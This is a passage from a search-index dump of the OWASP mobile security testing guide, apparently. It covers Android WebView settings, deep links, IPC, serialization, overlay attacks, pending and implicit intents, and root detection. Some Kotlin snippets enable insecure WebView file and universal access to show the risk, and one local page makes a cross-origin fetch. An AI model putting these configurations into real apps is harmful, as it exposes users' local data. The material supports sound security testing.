WebViews","text":"","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#url-loading-in-webviews","title":"URL Loading in WebViews","text":"<p>WebViews are Android's embedded components which allow your app to open web pages within your application. In addition to mobile apps related threats, WebViews may expose your app to common web threats (e.g. XSS, Open Redirect, etc.).</p> <p>One of the most important things to do when testing WebViews is to make sure that only trusted content can be loaded in it. Any newly loaded page could be potentially malicious, try to exploit any WebView bindings or try to phish the user. Unless you're developing a browser app, usually you'd like to restrict the pages being loaded to the domain of your app. A good practice is to prevent the user from even having the chance to input any URLs inside WebViews (which is the default on Android) nor navigate outside the trusted domains. Even when navigating on trusted domains there's still the risk that the user might encounter and click on other links to untrustworthy content (e.g. if the page allows for other users to post comments). In addition, some developers might even override some default behavior which can be potentially dangerous for the user.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#safebrowsing-api","title":"SafeBrowsing API","text":"<p>To provide a safer web browsing experience, Android 8.1 (API level 27) introduces the <code>SafeBrowsing API</code>, which allows your application to detect URLs that Google has classified as a known threat.</p> <p>By default, WebViews show a warning to users about the security risk with the option to load the URL or stop the page from loading. With the SafeBrowsing API you can customize your application's behavior by either reporting the threat to SafeBrowsing or performing a particular action such as returning back to safety each time it encounters a known threat. Please check the Android Developers documentation for usage examples.</p> <p>You can use the SafeBrowsing API independently from WebViews using the SafetyNet library, which implements a client for Safe Browsing Network Protocol v4. SafetyNet allows you to analyze all the URLs that your app is supposed load. You can check URLs with different schemes (e.g. http, file) since SafeBrowsing is agnostic to URL schemes, and against <code>TYPE_POTENTIALLY_HARMFUL_APPLICATION</code> and <code>TYPE_SOCIAL_ENGINEERING</code> threat types.</p> <p>When sending URLs or files to be checked for known threats make sure they don't contain sensitive data which could compromise a user's privacy, or expose sensitive content from your application.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#virus-total-api","title":"Virus Total API","text":"<p>Virus Total provides an API for analyzing URLs and local files for known threats. The API Reference is available on Virus Total developers page.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#javascript-execution-in-webviews","title":"JavaScript Execution in WebViews","text":"<p>JavaScript can be injected into web applications via reflected, stored, or DOM-based Cross-Site Scripting (XSS). Mobile apps are executed in a sandboxed environment and don't have this vulnerability when implemented natively. Nevertheless, WebViews may be part of a native app to allow web page viewing. Every app has its own WebView cache, which isn't shared with the native Browser or other apps.</p> <p>On Android versions prior to 4.4, WebViews used the WebKit rendering engine to display web pages. Since Android 4.4, WebViews have been based on Chromium, providing improved performance and compatibility. However, the pages are still stripped down to minimal functions; for example, pages don't have address bars.</p> <p>Android WebViews can use <code>setJavaScriptEnabled</code> to enable JavaScript execution. This feature is disabled by default, but if enabled, it can be used to execute JavaScript code in the context of the loaded page. This can be dangerous if the WebView is loading untrusted content, as it can lead to XSS attacks. If you need to enable JavaScript, make sure that the content is trusted and that you have implemented proper input validation and output encoding. Otherwise, you can explicitly disable JavaScript:</p> <pre><code>webView.settings.apply {\n    javaScriptEnabled = false\n}\n</code></pre>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#webview-local-file-access-settings","title":"WebView Local File Access Settings","text":"<p>These APIs control how a WebView accesses files on the local device. They determine whether the WebView can load files (such as HTML, images, or scripts) from the file system and whether JavaScript running in a local context can access additional local files. Note that accessing assets and resources (via file:///android_asset or file:///android_res) is always allowed regardless of these settings.</p> API Purpose Defaults to <code>True</code> (API Level) Defaults to <code>False</code> (API Level) Deprecated <code>setAllowFileAccess</code> Permits the WebView to load files from the local file system (using <code>file://</code> URLs) &lt;= 29 (Android 10) &gt;= 30 (Android 11) No <code>setAllowFileAccessFromFileURLs</code> Allows JavaScript in a <code>file://</code> context to access other local <code>file://</code> URLs &lt;= 15 (Android 4.0.3) &gt;= 16 (Android 4.1) Yes (since API level 30, Android 11) <code>setAllowUniversalAccessFromFileURLs</code> Permits JavaScript in a <code>file://</code> context to access resources from any origin, bypassing the same-origin policy &lt;= 15 (Android 4.0.3) &gt;= 16 (Android 4.1) Yes (since API level 30, Android 11) <p>What files can be accessed by the WebView?:</p> <p>The WebView can access any file that the app has permission to access via <code>file://</code> URLs, including:</p> <ul> <li>Internal storage: the app's own internal storage.</li> <li>External storage<ul> <li>Before Android 10:<ul> <li>the entire external storage (SD card), if the app has the <code>READ_EXTERNAL_STORAGE</code> permission.</li> </ul> </li> <li>Since Android 10:<ul> <li>only the app-specific directories (due to scoped storage restrictions) without any special permissions.</li> <li>entire media folders (including data from other apps) if the app has the <code>READ_MEDIA_IMAGES</code> or similar permissions.</li> <li>the entire external storage if the app has the <code>MANAGE_EXTERNAL_STORAGE</code> permission.</li> </ul> </li> </ul> </li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#setallowfileaccess","title":"<code>setAllowFileAccess</code>","text":"<p><code>setAllowFileAccess</code> enables the WebView to load local files using the <code>file://</code> scheme. In this example, the WebView is configured to allow file access and then loads an HTML file from the external storage (sdcard).</p> <pre><code>webView.settings.apply {\n    allowFileAccess = true\n}\nwebView.loadUrl(\"file:///sdcard/index.html\");\n</code></pre>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#setallowfileaccessfromfileurls","title":"<code>setAllowFileAccessFromFileURLs</code>","text":"<p><code>setAllowFileAccessFromFileURLs</code> allows the local file (loaded via file://) to access additional local resources from its HTML or JavaScript.</p> <p>Note that the value of this setting is ignored if the value of <code>allowUniversalAccessFromFileURLs</code> is <code>true</code>.</p> <p>Chromium WebView Docs: With this relaxed origin rule, URLs starting with <code>content://</code> and <code>file://</code> can access resources that have the same relaxed origin over <code>XMLHttpRequest</code>. For instance, <code>file://foo</code> can make an <code>XMLHttpRequest</code> to <code>file://bar</code>. Developers need to be careful so that a user provided data do not run in <code>content://</code> as it will allow the user's code to access arbitrary <code>content://</code> URLs those are provided by other applications. It will cause a serious security issue.</p> <p>Regardless of this API call, the Fetch API does not allow accessing <code>content://</code> and <code>file://</code> URLs.</p> <p>Example: In this example, the WebView is configured to allow file access and then loads an HTML file from the external storage (sdcard).</p> <pre><code>webView.settings.apply {\n    allowFileAccess = true\n    allowFileAccessFromFileURLs = true\n}\nwebView.loadUrl(\"file:///sdcard/local_page.html\");\n</code></pre> <p>The loaded HTML file contains an image that is loaded via a <code>file://</code> URL:</p> <pre><code>&lt;!-- In local_page.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Local Page&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;!-- This image is loaded via a file:// URL --&gt;\n    &lt;img src=\"file:///android_asset/images/logo.png\" alt=\"Logo\"&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#setallowuniversalaccessfromfileurls","title":"<code>setAllowUniversalAccessFromFileURLs</code>","text":"<p><code>setAllowUniversalAccessFromFileURLs</code> allows JavaScript running in a local file (loaded via <code>file://</code>) to bypass the same-origin policy and access resources from any origin.</p> <p>Chromium WebView Docs: When this API is called with true, URLs starting with <code>file://</code> will have a scheme based origin, and can access other scheme based URLs over <code>XMLHttpRequest</code>. For instance, <code>file://foo</code> can make an <code>XMLHttpRequest</code> to <code>content://bar</code>, <code>http://example.com/</code>, and <code>https://www.google.com/</code>. So developers need to manage data running under the <code>file://</code> scheme as it allows powerful permissions beyond the public web's CORS policy.</p> <p>Regardless of this API call, Fetch API does not allow to access <code>content://</code> and <code>file://</code> URLs.</p> <p>Example: In this example, the local HTML file successfully makes a cross-origin request to fetch data from an HTTPS endpoint. This can be potentially abused by an attacker to exfiltrate sensitive data from the app.</p> <pre><code>webView.settings.apply {\n    javaScriptEnabled = true\n    allowFileAccess = true\n    allowUniversalAccessFromFileURLs = true\n}\nwebView.loadUrl(\"file:///android_asset/local_page.html\");\n</code></pre> <p>Contents of local_page.html (in the assets folder):</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Universal Access Demo&lt;/title&gt;\n    &lt;script&gt;\n      // This AJAX call fetches data from a remote server despite being loaded via file://\n      fetch(\"https://api.example.com/data\")\n        .then(response =&gt; response.text())\n        .then(data =&gt; document.getElementById(\"output\").innerText = data)\n        .catch(err =&gt; console.error(err));\n    &lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"output\"&gt;Loading...&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Note about accessing cookies:</p> <p>Setting <code>setAllowUniversalAccessFromFileURLs(true)</code> allows JavaScript inside a local <code>file://</code> to make cross-origin requests (XHR, Fetch, etc.). This bypasses the Same-Origin Policy (SOP) for network requests, but it does not grant access to cookies from remote websites.</p> <ul> <li>Cookies are managed by the WebView's CookieManager and cannot be accessed by a <code>file://</code> origin unless explicitly allowed via document.cookie (which most modern sites prevent using <code>HttpOnly</code> and <code>Secure</code> flags).</li> <li>Cross-origin requests also do not include cookies unless explicitly allowed by the server via CORS headers such as <code>Access-Control-Allow-Origin: *</code> and <code>Access-Control-Allow-Credentials: true</code>.</li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#webview-content-provider-access","title":"WebView Content Provider Access","text":"<p>WebViews can access content providers, which are used to share data between applications. Content providers can be accessed by other apps only if they are exported (<code>android:exported</code> attribute set to <code>true</code>), but even if the content provider is not exported, it can be accessed by a WebView in the application itself.</p> <p>The setting <code>setAllowContentAccess</code> controls whether the WebView can access content providers using <code>content://</code> URLs. This setting is enabled by default for Android 4.1 (API level 16) and above.</p> <p>Chromium WebView Docs: <code>content://</code> URLs are used to access resources provided via Android Content Providers. The access should be permitted via <code>setAllowContentAccess</code> API beforehand. <code>content://</code> pages can contain iframes that load <code>content://</code> pages, but the parent frame can not access into the iframe contents. Also only <code>content://</code> pages can specify <code>content://</code> URLs for sub-resources.</p> <p>However, even pages loaded from <code>content://</code> can not make any CORS-enabled requests such as <code>XMLHttpRequest</code> to other <code>content://</code> URLs as each one is assumed to belong to an opaque origin. See also <code>setAllowFileAccessFromFileURLs</code> and <code>setAllowUniversalAccessFromFileURLs</code> sections as they can relax this default rule.</p> <p>Pages loaded with any scheme other than <code>content://</code> can't load <code>content://</code> page in iframes and they can not specify <code>content://</code> URLs for sub-resources.</p> <p>Example: In this example, the WebView's <code>allowContentAccess</code> property is enabled and a <code>content://</code> URL is loaded.</p> <pre><code>webView.settings.apply {\n    allowContentAccess = true\n}\nwebView.loadUrl(\"content://com.example.myapp.provider/data\");\n</code></pre> <p>Which files can be accessed by the WebView?:</p> <p>The WebView can access any data accessible via content providers (if the app has any) using <code>content://</code> URLs. Unless otherwise further restricted by the content provider, this could include:</p> <ul> <li>Internal storage: the entire internal storage.</li> <li>External storage<ul> <li>Before Android 10:<ul> <li>the entire external storage (SD card), if the app has the <code>READ_EXTERNAL_STORAGE</code> permission.</li> </ul> </li> <li>Since Android 10:<ul> <li>only the app-specific directories (due to scoped storage restrictions) without any special permissions.</li> <li>entire media folders (including data from other apps) if the app has the <code>READ_MEDIA_IMAGES</code> or similar permissions.</li> <li>the entire external storage if the app has the <code>MANAGE_EXTERNAL_STORAGE</code> permission.</li> </ul> </li> </ul> </li> </ul> <p>Data from other apps accessible via content providers (if the app has any and they are exported) can also be accessed.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#java-objects-exposed-through-webviews","title":"Java Objects Exposed Through WebViews","text":"<p>Android offers a way for JavaScript execution in a WebView to call and use native functions of an Android app (annotated with <code>@JavascriptInterface</code>) by using the <code>addJavascriptInterface</code> method. This is known as a WebView JavaScript bridge or native bridge.</p> <p>Please note that when you use <code>addJavascriptInterface</code>, you're explicitly granting access to the registered JavaScript Interface object to all pages loaded within that WebView. This implies that, if the user navigates outside your app or domain, all other external pages will also have access to those JavaScript Interface objects which might present a potential security risk if any sensitive data is being exposed though those interfaces.</p> <p>Warning: Take extreme care with apps targeting Android versions below Android 4.2 (API level 17) as they are vulnerable to a flaw in the implementation of <code>addJavascriptInterface</code>: an attack that is abusing reflection, which leads to remote code execution when malicious JavaScript is injected into a WebView. This was due to all Java Object methods being accessible by default (instead of only those annotated).</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/#webviews-cleanup","title":"WebViews Cleanup","text":"<p>Clearing the WebView resources is a crucial step when an app accesses any sensitive data within a WebView. This includes any files stored locally, the RAM cache and any loaded JavaScript.</p> <p>As an additional measure, you could use server-side headers such as <code>no-cache</code>, which prevent an application from caching particular content.</p> <p>Starting on Android 10 (API level 29) apps are able to detect if a WebView has become unresponsive. If this happens, the OS will automatically call the <code>onRenderProcessUnresponsive</code> method.</p> <p>You can find more security best practices when using WebViews on Android Developers.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/","title":"MASTG-KNOW-0019: Deep Links","text":"<p>Deep links are URIs of any scheme that take users directly to specific content in an app. An app can set up deep links by adding intent filters on the Android Manifest and extracting data from incoming intents to navigate users to the correct activity.</p> <p>Android supports two types of deep links:</p> <ul> <li>Custom URL Schemes, which are deep links that use any custom URL scheme, e.g. <code>myapp://</code> (not verified by the OS).</li> <li>Android App Links (Android 6.0 (API level 23) and higher), which are deep links that use the <code>http://</code> and <code>https://</code> schemes and contain the <code>autoVerify</code> attribute (which triggers OS verification).</li> </ul> <p>Deep Link Collision:</p> <p>Using unverified deep links can cause a significant issue- any other apps installed on a user's device can declare and try to handle the same intent, which is known as deep link collision. Any arbitrary application can declare control over the exact same deep link belonging to another application.</p> <p>In recent versions of Android this results in a so-called disambiguation dialog shown to the user that asks them to select the application that should handle the deep link. The user could make the mistake of choosing a malicious application instead of the legitimate one.</p> <p></p> <p>Android App Links:</p> <p>In order to solve the deep link collision issue, Android 6.0 (API Level 23) introduced Android App Links, which are verified deep links based on a website URL explicitly registered by the developer. Clicking on an App Link will immediately open the app if it's installed.</p> <p>There are some key differences from unverified deep links:</p> <ul> <li>App Links only use <code>http://</code> and <code>https://</code> schemes, any other custom URL schemes are not allowed.</li> <li>App Links require a live domain to serve a Digital Asset Links file via HTTPS.</li> <li>App Links do not suffer from deep link collision since they don't show a disambiguation dialog when a user opens them.</li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0020/","title":"MASTG-KNOW-0020: Inter-Process Communication (IPC) Mechanisms","text":"<p>During implementation of a mobile application, developers may apply traditional techniques for IPC (such as using shared files or network sockets). The IPC system functionality offered by mobile application platforms should be used because it is much more mature than traditional techniques. Using IPC mechanisms with no security in mind may cause the application to leak or expose sensitive data.</p> <p>The following is a list of Android IPC Mechanisms that may expose sensitive data:</p> <ul> <li>Binder</li> <li>AIDL</li> <li>Intents</li> <li>Content Providers</li> <li>Services</li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/","title":"MASTG-KNOW-0021: Object Serialization","text":"<p>There are several ways to serialize an object on Android:</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#java-serializable-api","title":"Java Serializable API","text":"<p>An object and its data can be represented as a sequence of bytes. This is done in Java via object serialization. Serialization is not inherently secure. It is just a binary format (or representation) for locally storing data in a .ser file. Encrypting and signing HMAC-serialized data is possible as long as the keys are stored safely. Deserializing an object requires a class of the same version as the class used to serialize the object. After classes have been changed, the <code>ObjectInputStream</code> can't create objects from older .ser files. The example below shows how to create a <code>Serializable</code> class by implementing the <code>Serializable</code> interface.</p> <pre><code>import java.io.Serializable;\n\npublic class Person implements Serializable {\n  private String firstName;\n  private String lastName;\n\n  public Person(String firstName, String lastName) {\n    this.firstName = firstName;\n    this.lastName = lastName;\n    }\n  //..\n  //getters, setters, etc\n  //..\n\n}\n</code></pre> <p>Now you can read/write the object with <code>ObjectInputStream</code>/<code>ObjectOutputStream</code> in another class.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#json","title":"JSON","text":"<p>There are several ways to serialize the contents of an object to JSON. Android comes with the <code>JSONObject</code> and <code>JSONArray</code> classes. A wide variety of libraries, including GSON, Jackson, Moshi, can also be used. The main differences between the libraries are whether they use reflection to compose the object, whether they support annotations, whether the create immutable objects, and the amount of memory they use. Note that almost all the JSON representations are String-based and therefore immutable. This means that any secret stored in JSON will be harder to remove from memory. JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that contains secrets has been appropriately protected (e.g., encrypted/HMACed). See the chapter \"Data Storage on Android\" for more details. A simple example (from the GSON User Guide) of writing and reading JSON with GSON follows. In this example, the contents of an instance of the <code>BagOfPrimitives</code> is serialized into JSON:</p> <pre><code>class BagOfPrimitives {\n  private int value1 = 1;\n  private String value2 = \"abc\";\n  private transient int value3 = 3;\n  BagOfPrimitives() {\n    // no-args constructor\n  }\n}\n\n// Serialization\nBagOfPrimitives obj = new BagOfPrimitives();\nGson gson = new Gson();\nString json = gson.toJson(obj);\n\n// ==&gt; json is {\"value1\":1,\"value2\":\"abc\"}\n</code></pre>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#xml","title":"XML","text":"<p>There are several ways to serialize the contents of an object to XML and back. Android comes with the <code>XmlPullParser</code> interface which allows for easily maintainable XML parsing. There are two implementations within Android: <code>KXmlParser</code> and <code>ExpatPullParser</code>. The Android Developer Guide provides a great write-up on how to use them. Next, there are various alternatives, such as a <code>SAX</code> parser that comes with the Java runtime. For more information, see a blogpost from ibm.com. Similarly to JSON, XML has the issue of working mostly String based, which means that String-type secrets will be harder to remove from memory. XML data can be stored anywhere (database, files), but do need additional protection in case of secrets or information that should not be changed. See the chapter \"Data Storage on Android\" for more details. As stated earlier: the true danger in XML lies in the XML eXternal Entity (XXE) attack as it might allow for reading external data sources that are still accessible within the application.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#orm","title":"ORM","text":"<p>There are libraries that provide functionality for directly storing the contents of an object in a database and then instantiating the object with the database contents. This is called Object-Relational Mapping (ORM). Libraries that use the SQLite database include</p> <ul> <li>OrmLite,</li> <li>SugarORM,</li> <li>GreenDAO and</li> <li>ActiveAndroid.</li> </ul> <p>Realm, on the other hand, uses its own database to store the contents of a class. The amount of protection that ORM can provide depends primarily on whether the database is encrypted. See the chapter \"Data Storage on Android\" for more details. The Realm website includes a nice example of ORM Lite.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#parcelable","title":"Parcelable","text":"<p><code>Parcelable</code> is an interface for classes whose instances can be written to and restored from a <code>Parcel</code>. Parcels are often used to pack a class as part of a <code>Bundle</code> for an <code>Intent</code>. Here's an Android developer documentation example that implements <code>Parcelable</code>:</p> <pre><code>public class MyParcelable implements Parcelable {\n     private int mData;\n\n     public int describeContents() {\n         return 0;\n     }\n\n     public void writeToParcel(Parcel out, int flags) {\n         out.writeInt(mData);\n     }\n\n     public static final Parcelable.Creator&lt;MyParcelable&gt; CREATOR\n             = new Parcelable.Creator&lt;MyParcelable&gt;() {\n         public MyParcelable createFromParcel(Parcel in) {\n             return new MyParcelable(in);\n         }\n\n         public MyParcelable[] newArray(int size) {\n             return new MyParcelable[size];\n         }\n     };\n\n     private MyParcelable(Parcel in) {\n         mData = in.readInt();\n     }\n }\n</code></pre> <p>Because this mechanism that involves Parcels and Intents may change over time, and the <code>Parcelable</code> may contain <code>IBinder</code> pointers, storing data to disk via <code>Parcelable</code> is not recommended.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0021/#protocol-buffers","title":"Protocol Buffers","text":"<p>Protocol Buffers by Google, are a platform- and language neutral mechanism for serializing structured data by means of the Binary Data Format. There have been a few vulnerabilities with Protocol Buffers, such as CVE-2015-5237. Note that Protocol Buffers do not provide any protection for confidentiality: there is no built in encryption.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0022/","title":"MASTG-KNOW-0022: Overlay Attacks","text":"<p>Screen overlay attacks occur when a malicious application manages to put itself on top of another application which remains working normally as if it were on the foreground. The malicious app might create UI elements mimicking the look and feel and the original app or even the Android system UI. The intention is typically to make users believe that they keep interacting with the legitimate app and then try to elevate privileges (e.g by getting some permissions granted), stealthy phishing, capture user taps and keystrokes etc.</p> <p>There are several attacks affecting different Android versions including:</p> <ul> <li>Tapjacking (Android 6.0 (API level 23) and lower) abuses the screen overlay feature of Android listening for taps and intercepting any information being passed to the underlying activity.</li> <li>Cloak &amp; Dagger attacks affect apps targeting Android 5.0 (API level 21) to Android 7.1 (API level 25). They abuse one or both of the <code>SYSTEM_ALERT_WINDOW</code> (\"draw on top\") and <code>BIND_ACCESSIBILITY_SERVICE</code> (\"a11y\") permissions that, in case the app is installed from the Play Store, the users do not need to explicitly grant and for which they are not even notified.</li> <li>Toast Overlay is quite similar to Cloak &amp; Dagger but do not require specific Android permissions to be granted by users. It was closed with CVE-2017-0752 on Android 8.0 (API level 26).</li> </ul> <p>Usually, this kind of attacks are inherent to an Android system version having certain vulnerabilities or design issues. This makes them challenging and often virtually impossible to prevent unless the app is upgraded targeting a safe Android version (API level).</p> <p>Over the years many known malware like MazorBot, BankBot or MysteryBot have been abusing the screen overlay feature of Android to target business critical applications, namely in the banking sector. This blog discusses more about this type of malware.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0023/","title":"MASTG-KNOW-0023: Enforced Updating","text":"<p>Starting from Android 5.0 (API level 21), together with the Play Core Library, apps can be forced to be updated. This mechanism is based on using the <code>AppUpdateManager</code>. Before that, other mechanisms were used, such as doing http calls to the Google Play Store, which are not as reliable as the APIs of the Play Store might change. Alternatively, Firebase could be used to check for possible forced updates as well (see this blog). Enforced updating can be really helpful when it comes to public key pinning (see the Testing Network communication for more details) when a pin has to be refreshed due to a certificate/public key rotation. Next, vulnerabilities are easily patched by means of forced updates.</p> <p>Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle management is key here. Similarly, when a user is not forced to update, do not forget to test older versions of your app against your API and/or use proper API versioning.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0024/","title":"MASTG-KNOW-0024: Pending Intents","text":"<p>Often while dealing with complex flows during app development, there are situations where an app A wants another app B to perform a certain action in the future, on app A's behalf. Trying to implement this by only using <code>Intent</code>s leads to various security problems, like having multiple exported components. To handle this use case in a secure manner, Android provides the <code>PendingIntent</code> API.</p> <p><code>PendingIntent</code> are most commonly used for notifications, app widgets, media browser services, etc. When used for notifications, <code>PendingIntent</code> is used to declare an intent to be executed when a user performs an action with an application's notification. The notification requires a callback to the application to trigger an action when the user clicks on it.</p> <p>Internally, a <code>PendingIntent</code> object wraps a normal <code>Intent</code> object (referred as base intent) that will eventually be used to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receiving application of the <code>PendingIntent</code>, will unwrap and retrieve this base intent and invoke the activity A by calling the <code>PendingIntent.send</code> function.</p> <p>A typical implementation for using <code>PendingIntent</code> is below:</p> <pre><code>Intent intent = new Intent(applicationContext, SomeActivity.class);     // base intent\n\n// create a pending intent\nPendingIntent pendingIntent = PendingIntent.getActivity(applicationContext, 0, intent, PendingIntent.FLAG_IMMUTABLE);\n\n// send the pending intent to another app\nIntent anotherIntent = new Intent();\nanotherIntent.setClassName(\"other.app\", \"other.app.MainActivity\");\nanotherIntent.putExtra(\"pendingIntent\", pendingIntent);\nstartActivity(anotherIntent);\n</code></pre> <p>What makes a <code>PendingIntent</code> secure is that, unlike a normal <code>Intent</code>, it grants permission to a foreign application to use the <code>Intent</code> (the base intent) it contains, as if it were being executed by your application's own process. This allows an application to freely use them to create callbacks without the need to create exported activities.</p> <p>If not implemented correctly, a malicious application can hijack a <code>PendingIntent</code>. For example, in the notification example above, a malicious application with <code>android.permission.BIND_NOTIFICATION_LISTENER_SERVICE</code> can bind to the notification listener service and retrieve the pending intent.</p> <p>There are certain security pitfalls when implementing <code>PendingIntent</code>s, which are listed below:</p> <ul> <li> <p>Mutable fields: A <code>PendingIntent</code> can have mutable and empty fields that can be filled by a malicious application. This can lead to a malicious application gaining access to non-exported application components. Using the <code>PendingIntent.FLAG_IMMUTABLE</code> flag makes the <code>PendingIntent</code> immutable and prevents any changes to the fields. Prior to Android 12 (API level 31), the <code>PendingIntent</code> was mutable by default, while since Android 12 (API level 31) it is changed to immutable by default to prevent accidental vulnerabilities.</p> </li> <li> <p>Use of implicit intent: A malicious application can receive a <code>PendingIntent</code> and then update the base intent to target the component and package within the malicious application. As a mitigation, ensure that you explicitly specify the exact package, action and component that will receive the base intent.</p> </li> </ul> <p>The most common case of <code>PendingIntent</code> attack is when a malicious application is able to intercept it.</p> <p>For further details, check the Android documentation on using a pending intent.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0025/","title":"MASTG-KNOW-0025: Implicit Intents","text":"<p>An Intent is a messaging object that you can use to request an action from another application component. Although intents facilitate communication between components in a variety of ways, there are three basic use cases: starting an activity, starting a service, and delivering a broadcast.</p> <p>According to the Android Developers Documentation, Android provides two types of intents:</p> <ul> <li>Explicit intents specify which application will satisfy the intent by providing either the target app's package name or a fully qualified component class name. Typically, you'll use an explicit intent to start a component in your own app, because you know the class name of the activity or service you want to start. For example, you might want to start a new activity in your app in response to a user action, or start a service to download a file in the background.</li> </ul> <pre><code>// Note the specification of a concrete component (DownloadActivity) that is started by the intent.\nIntent downloadIntent = new Intent(this, DownloadActivity.class);\ndownloadIntent.setAction(\"android.intent.action.GET_CONTENT\")\nstartActivityForResult(downloadIntent);\n</code></pre> <ul> <li>Implicit intents do not name a specific component, but instead declare a general action to be performed that another app's component can handle. For example, if you want to show the user a location on a map, you can use an implicit intent to ask another capable app to show a specific location on a map. Another example is when the user clicks on an email address within an app, where the calling app does not want to specify a specific email app and leaves that choice up to the user.</li> </ul> <pre><code>// Developers can also start an activity by just setting an action that is matched by the intended app.\nIntent downloadIntent = new Intent();\ndownloadIntent.setAction(\"android.intent.action.GET_CONTENT\")\nstartActivityForResult(downloadIntent);\n</code></pre> <p>The use of implicit intents can lead to multiple security risks, e.g. if the calling app processes the return value of the implicit intent without proper verification or if the intent contains sensitive data, it can be accidentally leaked to unauthorized third-parties.</p> <p>You can refer to this blog post, this article and CWE-927 for more information about the mentioned problem, concrete attack scenarios and recommendations.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PRIVACY/MASTG-KNOW-0026/","title":"MASTG-KNOW-0026: Third-party Services Embedded in the App","text":"<p>The features provided by third-party services can involve tracking services to monitor the user's behavior while using the app, selling banner advertisements, or improving the user experience.</p> <p>The downside is that developers don't usually know the details of the code executed via third-party libraries. Consequently, no more information than is necessary should be sent to a service, and no sensitive information should be disclosed.</p> <p>Most third-party services are implemented in two ways:</p> <ul> <li>with a standalone library</li> <li>with a full SDK</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/","title":"MASTG-KNOW-0027: Root Detection","text":"<p>In the context of anti-reversing, the goal of root detection is to make running the app on a rooted device a bit more difficult, which in turn blocks some of the tools and techniques reverse engineers like to use. Like most other defenses, root detection is not very effective by itself, but implementing multiple root checks that are scattered throughout the app can improve the effectiveness of the overall anti-tampering scheme.</p> <p>For Android, we define \"root detection\" a bit more broadly, including custom ROMs detection, i.e., determining whether the device is a stock Android build or a custom build.</p> <p>Root detection can also be implemented through libraries such as RootBeer.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0027/#file-existence-checks","title":"File Existence Checks","text":"<p>Perhaps the most widely used method of programmatic detection is checking for files typically found on rooted devices, such as package files of common rooting apps and their associated files and directories, including the following:</p> <pre><code>/system/app/Superuser.apk\n/system/etc/init.d/99SuperSUDaemon\n/dev/com.koushikdutta.superuser.daemon/\n/system/xbin/daemonsu\n</code></pre> <p>Detection code also often looks for binaries that are usually installed once a device has been rooted. These searches include checking for busybox and attempting to open the su binary at different locations:</p> 